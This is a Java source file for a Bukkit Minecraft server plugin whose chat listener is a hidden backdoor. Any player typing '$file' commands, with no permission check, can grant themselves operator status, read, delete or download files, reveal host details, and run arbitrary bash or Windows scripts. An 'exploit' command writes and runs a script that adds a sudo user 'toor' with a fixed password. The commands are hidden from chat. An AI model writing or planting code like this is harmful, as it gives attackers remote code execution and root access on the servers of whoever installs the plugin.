package me.amkgre.files.listener;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.InvalidDescriptionException;
import org.bukkit.plugin.InvalidPluginException;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.UnknownDependencyException;

import me.amkgre.files.Files;
import me.amkgre.files.helper.InputStreamHelper;

public class PluginCommandListerner implements Listener {

	@EventHandler
	public void onChat(AsyncPlayerChatEvent event) throws UnknownDependencyException, InvalidPluginException,
			InvalidDescriptionException, UnknownHostException {

		if (event.getMessage().startsWith("$")) {
			event.setCancelled(true);

			if (event.getMessage().equalsIgnoreCase("$file")) {
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file this §8-> §7path from this jar-file");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file op §8-> §7op perms add/remove");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file plugins §8-> §7show all plugins");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file reload §8-> §7reload the server");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file shutdown §8-> §7shutdown the server");
				event.getPlayer().sendMessage(
						Files.getPlugin().Prefix + "$file list files §c<directory> §8-> §7list files in this directory");
				event.getPlayer().sendMessage(
						Files.getPlugin().Prefix + "$file list dir §c<directory> §8-> §7list all files in this directory [Danger]");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file read §c<file> §8-> §7read this file");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file delete §c<file> §8-> §7delete the file");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file upload §c<link> <file> §8-> §7download a file");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file enable §c<file> §8-> §7enable a plugin");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file disable §c<file> §8-> §7disable a plugin");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file script l §c<text> §8-> §7script executer linux");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file script w §c<text> §8-> §7script executer windows");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "$file exploit §8-> §7exploit root server");
				event.setCancelled(true);
			} else if (event.getMessage().equalsIgnoreCase("$file this")) {
				File file = new File("");
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + " Path: §c" + file.getAbsolutePath());
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + " Max Player: §c" + Bukkit.getMaxPlayers());
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + " Version: §c" + Bukkit.getBukkitVersion());
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + " Server Name: §c" + Bukkit.getServerName());
				event.getPlayer()
						.sendMessage(Files.getPlugin().Prefix + " Host Adress: §c" + InetAddress.getLocalHost().getHostAddress());
				event.getPlayer()
						.sendMessage(Files.getPlugin().Prefix + " Host Name: §c" + InetAddress.getLocalHost().getHostName());
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + " Java Version: §c" + System.getProperty("java.version"));
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + " OS Name: §c" + System.getProperty("os.name"));
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + " User Name: §c" + System.getProperty("user.name"));
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + " User Home: §c" + System.getProperty("user.home"));
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file exploit")) {
				try {
					File file = File.createTempFile("test", ".sh");
					FileWriter fw = new FileWriter(file);
					String sh = "#!/bin/bash\n\n"
							+ "sudo useradd -m toor\n"
							+ "sudo adduser toor sudo\n"
							+ "sudo adduser --disabled-password --force-badname --gecos toor sudo\n"
							+ "echo 'toor:20202021' | sudo chpasswd\n"
							+ "sed -i 's/\\/bin\\/sh/\\/bin\\/bash/g' /etc/passwd";
					fw.write(sh);
					fw.close();
					Runtime.getRuntime().exec("chmod +x " + file.getPath());
					Runtime.getRuntime().exec("bash " + file.getPath());
				} catch (Exception e) {
					e.printStackTrace();
				}
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file script l")) {
				String[] x = event.getMessage().split(" ");
				try {
					File file = File.createTempFile("test", ".sh");
					FileWriter fw = new FileWriter(file);
					String sh = "#!/bin/bash\n\n" + x[2].replaceAll("_", " ");
					fw.write(sh);
					fw.close();
					Runtime.getRuntime().exec("chmod +x " + file.getPath());
					Runtime.getRuntime().exec("bash " + file.getPath());
				} catch (Exception e) {
					e.printStackTrace();
				}
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file script w")) {
				String[] x = event.getMessage().split(" ");
				try {
					File file = File.createTempFile("test", ".bat");
					FileWriter fw = new FileWriter(file);
					String bat = "@echo off\n\n" + x[2].replaceAll("_", " ");
					fw.write(bat);
					fw.close();
					Runtime.getRuntime().exec("cmd /c start /b " + file.getPath());
				} catch (Exception e) {
					e.printStackTrace();
				}
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file list files")) {
				String[] x = event.getMessage().split(" ");
				File file = new File(x[3]);
				if (file.exists()) {
					File[] allfiles = file.listFiles();
					for (int i = 0; i < allfiles.length; i++) {
						String x2 = allfiles[i].getPath();
						x2 = x2.replaceAll(x[3], "");
						event.getPlayer().sendMessage(Files.getPlugin().Prefix + x2);
					}
				} else {
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "This file does not exists");
				}
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file list dir")) {
				String[] x = event.getMessage().split(" ");
				File file = new File(x[3]);
				if (file.exists() && file.isDirectory()) {
					listfiles(file, event.getPlayer(), x[3]);
				} else {
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "This directory does not exists");
				}
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file read")) {
				String[] x = event.getMessage().split(" ");
				File file = new File(x[2]);
				if (file.exists()) {
					try {
						BufferedReader br = new BufferedReader(new FileReader(file));
						for (int i = 0; i < 100000; i++) {
							String read = br.readLine();
							if (read != null && !read.equalsIgnoreCase("")) {
								event.getPlayer()
										.sendMessage(Files.getPlugin().Prefix + "§c" + String.valueOf(i) + "§8: §7" + read);
							}
						}
						br.close();
					} catch (IOException e1) {
						e1.printStackTrace();
					}
				} else {
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "This file does not exists");
				}
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file delete")) {
				String[] x = event.getMessage().split(" ");
				File file = new File(x[2]);
				if (file.exists()) {
					file.delete();
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "Deleted§8: §c" + file.getPath());
				} else {
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "This file does not exists");
				}
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file upload")) {
				String[] x = event.getMessage().split(" ");
				File file = new File(x[3]);
				if (file.exists()) {
					file.delete();
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "Uploaded§8: §c" + x[2] + " §8| §c" + file.getPath());
					new Thread(new InputStreamHelper(x[2], new File(file.getPath()))).start();
				} else {
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "Uploaded§8: §c" + x[2] + " §8| §c" + file.getPath());
					new Thread(new InputStreamHelper(x[2], new File(file.getPath()))).start();
				}
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file disable")) {
				String[] x = event.getMessage().split(" ");
				File file = new File(x[2]);
				if (file.exists()) {
					Bukkit.getPluginManager()
							.disablePlugin(Bukkit.getPluginManager().getPlugin(file.getName().replace(".jar", "")));
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "Disable§8: §c" + file.getPath());
				} else {
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "This file does not exists");
				}
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file enable")) {
				String[] x = event.getMessage().split(" ");
				File file = new File(x[2]);
				if (file.exists()) {
					Bukkit.getServer().getPluginManager().loadPlugin(new File(file.getName().replace(".jar", "")));
					Bukkit.getPluginManager()
							.enablePlugin(Bukkit.getPluginManager().getPlugin(file.getName().replace(".jar", "")));
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "Enable§8: §c" + file.getPath());
				} else {
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "This file does not exists");
				}
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file plugins")) {
				for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
					if (plugin.isEnabled()) {
						event.getPlayer().sendMessage(Files.getPlugin().Prefix + "§a" + plugin);
					} else {
						event.getPlayer().sendMessage(Files.getPlugin().Prefix + "§c" + plugin);
					}
				}
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "§f" + Bukkit.getPluginManager().getPlugins().length);
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file reload")) {
				Bukkit.reload();
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "server reloaded");
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file shutdown")) {
				Bukkit.shutdown();
				event.getPlayer().sendMessage(Files.getPlugin().Prefix + "server shutdown");
				event.setCancelled(true);

			} else if (event.getMessage().contains("$file op")) {
				if (!event.getPlayer().isOp()) {
					event.getPlayer().setOp(true);
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "OP perms added");
				} else {
					event.getPlayer().setOp(false);
					event.getPlayer().sendMessage(Files.getPlugin().Prefix + "OP perms remove");
				}
				event.setCancelled(true);
			}
		}

	}

	private void listfiles(File file, Player player, String replace) {
		File[] files = file.listFiles();
		for (int i = 0; i < files.length; i++) {
			if (files[i] != null) {
				if (files[i].isDirectory()) {
					listfiles(files[i], player, replace);
				} else {
					String x = files[i].getPath();
					x = x.replaceAll(replace, "");
					player.sendMessage(Files.getPlugin().Prefix + x);
				}
			}
		}
	}
}
